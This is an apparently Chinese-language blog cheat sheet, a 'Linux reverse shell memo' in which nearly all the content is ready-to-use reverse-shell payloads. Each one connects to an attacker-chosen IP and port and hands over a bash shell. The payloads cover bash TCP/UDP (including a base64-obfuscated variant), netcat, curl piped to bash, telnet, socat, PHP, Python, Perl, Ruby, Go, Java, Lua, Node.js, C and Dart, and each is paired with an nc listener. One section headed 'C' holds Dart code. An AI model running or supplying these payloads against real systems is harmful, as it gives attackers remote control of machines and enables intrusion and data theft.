---
title: Linux反弹shell备忘录
date: 2022-05-17 23:40:57
tags:
---

## Bash

### TCP

```bash
nc -lvnp <port>

# +---------------------+

bash -i >& /dev/tcp/<ip>/<port> 0>&1

0<&196;exec 196<>/dev/tcp/<ip>/<port>; bash <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/<ip>/<port> 0<&1 2>&1

exec 5<>/dev/tcp/<ip>/<port>
cat <&5 | while read line; do $line 2>&5 >&5; done

exec 2>&0;0<&196;exec 196<>/dev/tcp/<ip>/<port>; bash <&196 >&196 2>&196

# 加密
# bash -i >& /dev/tcp/<ip>/<port> 0>&1
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx" | base64 -d | bash
```

### UDP

```bash
nc -lvup <port>

# +---------------------+

bash -i >& /dev/udp/<ip>/<port> 0>&1

0<&196;exec 196<>/dev/udp/<ip>/<port>; bash <&196 >&196 2>&196

/bin/bash -l > /dev/udp/<ip>/<port> 0<&1 2>&1

exec 5<>/dev/udp/<ip>/<port>
cat <&5 | while read line; do $line 2>&5 >&5; done

exec 2>&0;0<&196;exec 196<>/dev/udp/<ip>/<port>; bash <&196 >&196 2>&196

# 加密
# bash -i >& /dev/udp/<ip>/<port> 0>&1
echo "YmFzaCAtaSA+JiAvZGV2L3VkcC88aXA+Lzxwb3J0PiAwPiYx" | base64 -d | bash
```

## NetCat

```bash
nc -lvnp <port>

# +---------------------+

nc <ip> <port> -e bash

nc <ip> <port> -c bash

mknod /tmp/backpipe p;/bin/bash 0</tmp/backpipe | nc <ip> <port> 1>/tmp/backpipe | rm /tmp/backpipe;
```

## Curl

```bash
nc -lvnp <port>

# +---------------------+

echo "bash -i >& /dev/tcp/<ip>/<port> 0>&1" > bash.html
python3 -m http.server
curl <ip>:8000/bash.html | bash
```

## Whois

```bash
nc -lvnp <port>

# +---------------------+

# 不推荐
whois -h <ip> -p <port> `pwd` 
```

## Telnet

```bash
nc -lvnp <port>
nc -lvnp <port2>

# +---------------------+

telnet <ip> <port> | /bin/bash | telnet <ip> <port2>
```

## Socat

```bash
nc -lvnp <port>

# +---------------------+

socat tcp-connect:<ip>:<port> exec:"bash -li",pty,stderr,setsid,sigint,sane
```

## PHP

```bash
nc -lvnp <port>

# +---------------------+

php -r '$sock=fsockopen("<ip>",<port>);`/bin/bash -i <&3 >&3 2>&3`;'

php -r '$sock=fsockopen("<ip>",<port>);exec("/bin/bash -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("<ip>",<port>);popen("/bin/bash -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("<ip>",<port>);system("/bin/bash -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("<ip>",<port>);passthru("/bin/bash -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("<ip>",<port>);shell_exec("/bin/bash -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("<ip>",<port>);$proc=proc_open("/bin/bash -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

## Python

```bash
nc -lvnp <port>

# +---------------------+

python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("<ip>",<port>));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/bash")'

python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("<ip>",<port>));f=s.fileno;c(["/bin/bash","-i"],stdin=f(),stdout=f(),stderr=f())'

python -c 'a=__import__;b=a("socket").socket;p=a("subprocess").call;o=a("os").dup2;s=b();s.connect(("<ip>",<port>));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/bash","-i"])'

python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("<ip>",<port>));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/bash")'

python -c 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("<ip>",<port>));f=s.fileno;c(["/bin/bash","-i"],stdin=f(),stdout=f(),stderr=f())'

python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("<ip>",<port>));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/bash","-i"])'

python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));subprocess.call(["/bin/bash","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

export RHOST="<ip>";export RPORT=<port>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

python -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));subprocess.call(["/bin/bash","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

## Perl

```bash
nc -lvnp <port>

# +---------------------+

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<ip>:<port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

perl -e 'use Socket;$i="<ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

## Ruby

```bash
nc -lvnp <port>

# +---------------------+

ruby -rsocket -e'f=TCPSocket.open("<ip>",<port>).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e'exit if fork;c=TCPSocket.new("<ip>","<port>");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```

## Golang

```bash
nc -lvnp <port>

# +---------------------+

echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<ip>:<port>");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

## Java

```bash
nc -lvnp <port>

# +---------------------+

Runtime.getRuntime().exec("/bin/bash -c 'exec 5<>/dev/tcp/<ip>/<port>;cat <&5 | while read line; do $line 2>&5 >&5; done'").waitFor();

Process p=new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();Socket s=new Socket("<ip>",<port>);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Lua

```bash
nc -lvnp <port>

# +---------------------+

lua -e "require('socket');require('os');t=socket.tcp();t:connect('<ip>','<port>');os.execute('/bin/bash -i <&3 >&3 2>&3');"

lua5.1 -e 'local host, port = "<ip>", <port> local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

## NodeJS

```bash
nc -lvnp <port>

# +---------------------+

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(<port>, "<ip>", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();

require('child_process').exec('nc -e /bin/bash <ip> <port>')

global.process.mainModule.require('child_process').exec('nc <ip> <port> -e /bin/bash')
```

## C

```bash
nc -lvnp <port>

# +---------------------+

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int main(void){
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(<port>);
    revsockaddr.sin_addr.s_addr = inet_addr("<ip>");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/bash", NULL};
    execve("/bin/bash", argv, NULL);

    return 0;       
}

gcc /tmp/shell.c --output csh && csh
```

## C

```bash
nc -lvnp <port>

# +---------------------+

import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("<ip>", <port>).then((socket) {
    socket.listen((data) {
      Process.start('/bin/bash', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}
```

## 参考

> [https://blog.csdn.net/qq_46717339/article/details/119650409#t23](https://blog.csdn.net/qq_46717339/article/details/119650409#t23)
> [https://blkstone.github.io/2017/12/30/reverse-shell/](https://blkstone.github.io/2017/12/30/reverse-shell/)